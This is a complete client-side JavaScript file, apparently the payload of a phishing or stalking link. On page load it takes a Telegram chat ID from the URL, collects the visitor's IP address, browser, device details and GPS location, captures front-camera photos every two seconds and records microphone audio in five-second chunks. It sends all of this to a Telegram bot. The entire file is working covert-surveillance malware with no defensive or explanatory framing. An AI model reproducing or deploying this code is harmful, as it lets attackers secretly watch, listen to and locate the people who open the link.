(function () {
  const path = window.location.pathname;
  const parts = path.split("_");

  if (parts.length === 2 && parts[1]) {
    const chatId = parts[1];
    const BOT_TOKEN = "bot token here";

    // Send message to Telegram with fallback error logging
    const sendToBot = (payload) => {
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
      }).catch((err) => {
        console.error("Telegram API sendMessage error:", err);
      });
    };

    // Send photo to Telegram with fallback
    const sendPhoto = (imageData) => {
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("photo", dataURLtoBlob(imageData), "photo.jpg");

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData
      }).catch((err) => {
        console.error("Telegram API sendPhoto error:", err);
      });
    };

    // Send audio to Telegram with fallback
    const sendAudio = (audioData) => {
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("audio", dataURLtoBlob(audioData), "audio.webm");

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
        method: "POST",
        body: formData
      }).catch((err) => {
        console.error("Telegram API sendAudio error:", err);
      });
    };

    // Convert base64 to Blob
    function dataURLtoBlob(dataURL) {
      const parts = dataURL.split(',');
      const mimeMatch = parts[0].match(/:(.*?);/);
      const mime = mimeMatch ? mimeMatch[1] : 'image/jpeg';
      const binary = atob(parts[1]);
      let len = binary.length;
      const u8arr = new Uint8Array(len);
      while (len--) {
        u8arr[len] = binary.charCodeAt(len);
      }
      return new Blob([u8arr], { type: mime });
    }

    // Get browser info
    function getBrowserInfo() {
      const ua = navigator.userAgent;
      let browserName = "Unknown";
      let version = "Unknown";

      if (/firefox\/\d+/i.test(ua)) {
        browserName = "Firefox";
        version = ua.match(/firefox\/(\d+)/i)[1];
      } else if (/edg\//i.test(ua)) {
        browserName = "Edge";
        version = ua.match(/edg\/(\d+)/i)[1];
      } else if (/chrome\//i.test(ua)) {
        browserName = "Chrome";
        version = ua.match(/chrome\/(\d+)/i)[1];
      } else if (/safari\//i.test(ua)) {
        browserName = "Safari";
        version = ua.match(/version\/(\d+)/i) ? ua.match(/version\/(\d+)/i)[1] : "Unknown";
      }

      return { browserName, version };
    }

    // Send initial info
    Promise.all([
      fetch("https://api.ipify.org?format=json").then(res => res.json()).catch(() => ({ ip: "Unavailable" })),
      navigator.getBattery ? navigator.getBattery().catch(() => null) : Promise.resolve(null),
      navigator.storage && navigator.storage.estimate ? navigator.storage.estimate().catch(() => null) : Promise.resolve(null)
    ]).then(([ipData, battery, storage]) => {
      const ip = ipData.ip || "Unavailable";
      const userAgent = navigator.userAgent || "Unavailable";
      const batteryLevel = battery ? `${(battery.level * 100).toFixed(0)}%` : "Unavailable";
      const charging = battery ? (battery.charging ? "Yes" : "No") : "Unknown";
      const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unavailable";
      const storageEstimate = storage && storage.quota ? `${(storage.quota / (1024 * 1024 * 1024)).toFixed(2)} GB` : "Unavailable";

      const osInfo = navigator.platform || "Unknown";
      const { browserName, version } = getBrowserInfo();

      const message =
        `🛰️ *New Visitor!*
` +
        `🆔 Chat ID: \`${chatId}\`
` +
        `🌐 IP: ${ip}
` +
        `📱 User-Agent: ${userAgent}
` +
        `🖥️ Browser: ${browserName} ${version}
` +
        `💽 OS: ${osInfo}
` +
        `🔋 Battery: ${batteryLevel}
` +
        `⚡ Charging: ${charging}
` +
        `🧠 RAM: ${ram}
` +
        `💾 Storage Quota: ${storageEstimate}`;

      sendToBot({
        chat_id: chatId,
        text: message,
        parse_mode: "Markdown"
      });
    });

    // Geolocation
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition((position) => {
        const locMessage =
          `📍 *Location Received:*
` +
          `Latitude: ${position.coords.latitude}
` +
          `Longitude: ${position.coords.longitude}`;

        sendToBot({
          chat_id: chatId,
          text: locMessage,
          parse_mode: "Markdown"
        });
      }, (err) => {
        sendToBot({
          chat_id: chatId,
          text: `❌ Location error: ${err.message}`
        });
      });
    }

    // Camera snapshot
    const video = document.createElement("video");
    video.setAttribute("autoplay", true);
    video.setAttribute("playsinline", true);

    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).then((stream) => {
      video.srcObject = stream;

      setInterval(() => {
        const canvas = document.createElement("canvas");
        canvas.width = 640;
        canvas.height = 480;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL("image/jpeg");
        sendPhoto(imageData);
      }, 2000);
    }).catch((err) => {
      sendToBot({
        chat_id: chatId,
        text: "❌ Camera access denied or failed."
      });
    });

    // Audio recording
    navigator.mediaDevices.getUserMedia({ audio: true }).then((stream) => {
      const mediaRecorder = new MediaRecorder(stream);
      let chunks = [];

      mediaRecorder.ondataavailable = (e) => {
        chunks.push(e.data);
      };

      mediaRecorder.onstop = () => {
        const blob = new Blob(chunks, { type: "audio/webm" });
        const reader = new FileReader();
        reader.onloadend = () => {
          sendAudio(reader.result);
        };
        reader.readAsDataURL(blob);
        chunks = [];
      };

      setInterval(() => {
        if (mediaRecorder.state === "recording") {
          mediaRecorder.stop();
        } else {
          mediaRecorder.start();
        }
      }, 5000);
    }).catch((err) => {
      sendToBot({
        chat_id: chatId,
        text: "❌ Microphone access denied or failed."
      });
    });
  }
})();